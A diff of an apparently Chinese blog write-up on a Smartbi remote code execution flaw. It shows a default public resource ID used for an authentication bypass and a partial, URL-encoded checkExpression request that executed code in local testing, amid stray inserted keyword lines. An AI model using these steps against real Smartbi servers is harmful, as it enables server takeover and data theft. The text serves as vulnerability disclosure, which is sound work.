@@ -8,8 +8,6 @@ asset_dir: embedded-base64
 
 SmartBi 是一款专业的企业级商业智能（BI）平台，致力于为用户提供高效、灵活的数据分析与可视化解决方案。它支持多源数据整合、自助式分析以及智能报表生成，帮助团队快速洞察业务趋势，赋能数据驱动的决策。Smartbi官方发布安全补丁修复了一处远程代码执行漏洞，该漏洞源于攻击者可通过默认资源ID[绕过身份验证获取权限](https://mrxn.net/tag/%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)，配合后台接口实现[远程代码执行](https://mrxn.net/tag/rce)，可能导致服务器被完全控制、数据泄露或业务系统沦陷。
 
-企业技术
-
 # 影响版本
 
 Smartbi <= 11.0.99471.25193
@@ -26,9 +24,17 @@ Smartbi <= 11.0.99471.25193
 
 # 权限绕过
 
+深入探索
+
+补丁
+
+软件
+
+企业安全咨询
+
 权限绕过主要是数据库存在两个默认的**publicshared**字段为1的，即可公开访问的资源ID。
 
-漏洞预警服务
+管理
 
 ```
 b904ab9f5a84712a672523a7b4881ee4
@@ -46,7 +52,7 @@ Host: smartbi.mrxn.net
 
 获取一个合法session
 
-数据管理
+漏洞修复方案
 
 # 代码执行
 
@@ -65,7 +71,7 @@ className=MetricsModelForVModule&methodName=checkExpression&params=%5b%22%76%61%
 
 本地测试[执行](https://mrxn.net/tag/rce)成功，弹出计算器。
 
-Windows安全工具
+数据管理
 
 # 参考
 
